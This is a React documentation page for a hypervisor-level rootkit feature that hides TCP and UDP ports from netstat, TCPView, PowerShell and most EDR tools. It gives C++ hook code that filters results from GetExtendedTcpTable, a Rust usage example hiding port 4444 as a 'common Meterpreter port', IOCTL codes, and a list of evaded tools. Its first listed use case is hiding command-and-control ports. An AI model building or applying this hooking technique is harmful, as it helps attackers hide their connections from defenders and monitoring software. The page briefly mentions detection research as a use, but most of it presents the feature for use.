import { Badge } from "@/components/ui/badge";
import { CodeBlock } from "@/components/code-block";
import { WarningBox } from "@/components/warning-box";

export default function PortHidingPage() {
  return (
    <div className="space-y-8">
      <div>
        <div className="flex items-center gap-3 mb-4">
          <h1 className="text-4xl font-bold">Port Hiding</h1>
          <Badge variant="outline">Ring -1</Badge>
        </div>
        <p className="text-lg text-muted-foreground">
          Hide TCP and UDP ports from network enumeration using hypervisor interception.
        </p>
      </div>

      <WarningBox variant="warning" title="Network Stealth">
        Hidden ports are still functional — connections work normally. Only the visibility 
        in enumeration tools is removed.
      </WarningBox>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Overview</h2>
        <p className="text-muted-foreground">
          Port hiding intercepts network enumeration APIs at the hypervisor level. When 
          tools like netstat, TCPView, or PowerShell query connections, the hypervisor 
          filters the results to remove entries for hidden ports.
        </p>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">What Gets Hidden</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• TCP listening sockets on hidden ports</li>
          <li>• TCP established connections from/to hidden ports</li>
          <li>• UDP bound sockets on hidden ports</li>
          <li>• Associated process information (owner PID)</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Implementation</h2>
        <CodeBlock
          language="cpp"
          filename="Algorithm"
          code={`// Port hiding hooks multiple IP Helper APIs
NTSTATUS HvHidePort(USHORT Port, USHORT Protocol) {
    // 1. Add port to hidden ports table
    AddToHiddenPortsList(Port, Protocol);
    
    // 2. Hook GetExtendedTcpTable/GetExtendedUdpTable via EPT
    // These are the core APIs used by netstat, TCPView, etc.
    
    if (!IsNetworkTableHooked()) {
        HookFunction("GetExtendedTcpTable", GetExtendedTcpTableHandler);
        HookFunction("GetExtendedUdpTable", GetExtendedUdpTableHandler);
        HookFunction("NsiEnumerateObjectsAllParameters", NsiEnumHandler);
    }
    
    return STATUS_SUCCESS;
}

// Hook handler for TCP table enumeration
DWORD GetExtendedTcpTableHandler(
    PVOID pTcpTable,
    PDWORD pdwSize,
    BOOL bOrder,
    ULONG ulAf,
    TCP_TABLE_CLASS TableClass,
    ULONG Reserved
) {
    // 1. Call original GetExtendedTcpTable
    DWORD Result = OriginalGetExtendedTcpTable(
        pTcpTable, pdwSize, bOrder, ulAf, TableClass, Reserved
    );
    
    // 2. Filter results
    if (Result == NO_ERROR && TableClass == TCP_TABLE_OWNER_PID_ALL) {
        PMIB_TCPTABLE_OWNER_PID Table = (PMIB_TCPTABLE_OWNER_PID)pTcpTable;
        DWORD WriteIndex = 0;
        
        for (DWORD i = 0; i < Table->dwNumEntries; i++) {
            USHORT LocalPort = ntohs((USHORT)Table->table[i].dwLocalPort);
            USHORT RemotePort = ntohs((USHORT)Table->table[i].dwRemotePort);
            
            // 3. Skip hidden ports
            if (!IsPortHidden(LocalPort, IPPROTO_TCP) && 
                !IsPortHidden(RemotePort, IPPROTO_TCP)) {
                if (WriteIndex != i) {
                    Table->table[WriteIndex] = Table->table[i];
                }
                WriteIndex++;
            }
        }
        
        // 4. Update entry count
        Table->dwNumEntries = WriteIndex;
    }
    
    return Result;
}`}
        />
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">API</h2>
        <CodeBlock
          language="rust"
          filename="Usage"
          code={`use callback::{hv_hide_port, hv_unhide_port, hv_list_hidden_ports, Protocol};

// Hide TCP port 4444 (common Meterpreter port)
hv_hide_port(4444, Protocol::Tcp)?;

// Hide UDP port 53 (DNS)
hv_hide_port(53, Protocol::Udp)?;

// Hide a port range
for port in 8000..=8100 {
    hv_hide_port(port, Protocol::Tcp)?;
}

// List all hidden ports
let hidden: Vec<(u16, Protocol)> = hv_list_hidden_ports()?;

// Unhide a port
hv_unhide_port(4444, Protocol::Tcp)?;`}
        />
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">IOCTLs</h2>
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-border">
                <th className="text-left py-2 px-3 font-semibold">IOCTL</th>
                <th className="text-left py-2 px-3 font-semibold">Code</th>
                <th className="text-left py-2 px-3 font-semibold">Description</th>
              </tr>
            </thead>
            <tbody>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs">HV_HIDE_PORT</td>
                <td className="py-2 px-3">0x870</td>
                <td className="py-2 px-3 text-muted-foreground">Hide port (port + protocol)</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs">HV_UNHIDE_PORT</td>
                <td className="py-2 px-3">0x871</td>
                <td className="py-2 px-3 text-muted-foreground">Unhide port</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs">HV_LIST_HIDDEN_PORTS</td>
                <td className="py-2 px-3">0x872</td>
                <td className="py-2 px-3 text-muted-foreground">List all hidden ports</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Detection Evasion</h2>
        <p className="text-muted-foreground">
          Port hiding at Ring -1 evades:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li>✓ netstat</li>
          <li>✓ TCPView / CurrPorts</li>
          <li>✓ Get-NetTCPConnection / Get-NetUDPEndpoint</li>
          <li>✓ GetExtendedTcpTable / GetExtendedUdpTable</li>
          <li>✓ NtDeviceIoControlFile to \Device\Nsi</li>
          <li>✓ Most EDR network monitoring</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Limitations</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• Packet capture (Wireshark, NDIS) still shows traffic</li>
          <li>• Network devices and firewalls see the connections</li>
          <li>• Hardware packet capture not affected</li>
          <li>• Does not hide from other hypervisors</li>
          <li>• Connection attempts logged at network perimeter</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">UI Access</h2>
        <p className="text-muted-foreground">
          Access via Hypervisor tab → Port Hiding section:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li>• Enter port number and select TCP/UDP</li>
          <li>• Add multiple ports with &quot;Add&quot; button</li>
          <li>• View all hidden ports in table</li>
          <li>• One-click unhide option per port</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Use Cases</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• Hide C2 communication ports</li>
          <li>• Test network security monitoring coverage</li>
          <li>• Research port hiding detection methods</li>
          <li>• Hide legitimate services from basic enumeration</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Related</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• <a href="/docs/kernel-hiding/process-hiding" className="text-violet hover:underline">Process Hiding</a> — Also hide the process using the port</li>
          <li>• <a href="/docs/usermode/network-monitoring" className="text-violet hover:underline">Network Monitoring</a> — View network connections in DioProcess</li>
        </ul>
      </section>
    </div>
  );
}
